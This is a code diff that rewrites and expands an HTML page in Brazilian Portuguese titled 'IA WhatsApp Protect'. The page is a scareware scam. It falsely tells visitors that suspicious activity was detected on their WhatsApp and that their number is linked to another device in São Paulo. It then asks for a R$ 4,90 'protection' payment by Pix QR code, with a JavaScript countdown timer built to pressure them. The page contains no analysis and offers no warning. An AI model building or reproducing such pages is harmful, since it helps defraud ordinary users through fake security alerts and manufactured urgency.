@@ -1,1 +1,103 @@
-<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>IA WhatsApp Protect</title><style>body{font-family:sans-serif;background:#fff;color:#111;text-align:center;padding:20px}h1{color:#006400}h2{margin-top:5px}p{font-size:17px;margin:10px 0}strong{color:red}.botao{margin-top:20px;background-color:#007f00;color:#fff;padding:12px 22px;border:none;border-radius:5px;font-size:16px;cursor:pointer}.botao:hover{background-color:#005f00}.qr{margin:25px auto}small{font-size:13px;color:#555}#timer{color:orange;margin-top:15px}</style></head><body><h1>🔒 IA WhatsApp Protect</h1><h2>Escudo de segurança ativado</h2><p>⚠️ <strong>Atividade suspeita em seu WhatsApp detectada</strong></p><p>Seu número pode estar vinculado a outro aparelho em <strong>SP</strong> – 03:12h.</p><p>O sistema ativou automaticamente o protocolo IA WhatsApp Protect com escaneamento de ameaças em tempo real.</p><p><strong>Valor único de proteção: R$ 4,90</strong></p><p><small>(IA WhatsApp Protect opera globalmente com menos de $1 USD)</small></p><div class="qr"><img src="SEU_QR_CODE_AQUI" alt="QR Code de Pagamento" width="200" height="200"></div><button class="botao">Copiar Chave Pix</button><div id="timer">⏳ Sua autenticação expira em 45 segundos.</div></body></html>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>IA WhatsApp Protect</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #000;
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .logo {
+      color: #25D366;
+      font-weight: bold;
+      font-size: 24px;
+    }
+
+    .title {
+      font-size: 22px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .alerta {
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+
+    .info {
+      font-size: 17px;
+      margin-top: 10px;
+      line-height: 1.5;
+    }
+
+    .negrito {
+      font-weight: bold;
+    }
+
+    .pix-btn {
+      background-color: #25D366;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+
+    .contador {
+      color: orange;
+      font-size: 15px;
+      margin-top: 20px;
+    }
+
+    img {
+      width: 220px;
+      margin: 20px auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">🔒 IA WhatsApp Protect</div>
+  <div class="title">Escudo de segurança ativado</div>
+
+  <div class="alerta">⚠️ Atividade suspeita em seu <b>WhatsApp</b> detectada</div>
+
+  <div class="info">
+    Seu número pode estar vinculado a outro aparelho: <b>+55 11 9XXX-26XX</b><br>
+    Localização suspeita: <b>São Paulo – 03:12h</b><br><br>
+    O sistema ativou automaticamente o protocolo <span class="negrito">IA WhatsApp Protect</span>, com escaneamento de ameaças em tempo real.<br><br>
+    <span class="negrito">Tecnologia baseada em Inteligência Artificial</span><br><br>
+    Valor único de proteção: <span class="negrito" style="color:red;">R$ 4,90</span><br>
+    (<i>IA WhatsApp Protect opera globalmente por menos de $1 USD</i>)<br><br>
+    <span class="negrito" style="color:green;">Faça a validação da proteção agora</span>
+  </div>
+
+  <img src="SEU-QR-CODE-AQUI.png" alt="QR Code de Pagamento">
+
+  <button class="pix-btn">Copiar Chave Pix</button>
+
+  <div class="contador" id="timer">⏳ Sua autenticação expira em 90 segundos.</div>
+
+  <script>
+    let segundos = 90;
+    const timer = document.getElementById('timer');
+    const intervalo = setInterval(() => {
+      segundos--;
+      timer.textContent = `⏳ Sua autenticação expira em ${segundos} segundos.`;
+      if (segundos <= 0) {
+        clearInterval(intervalo);
+        timer.textContent = "⚠️ Autenticação expirada. Atualize para tentar novamente.";
+        timer.style.color = "red";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
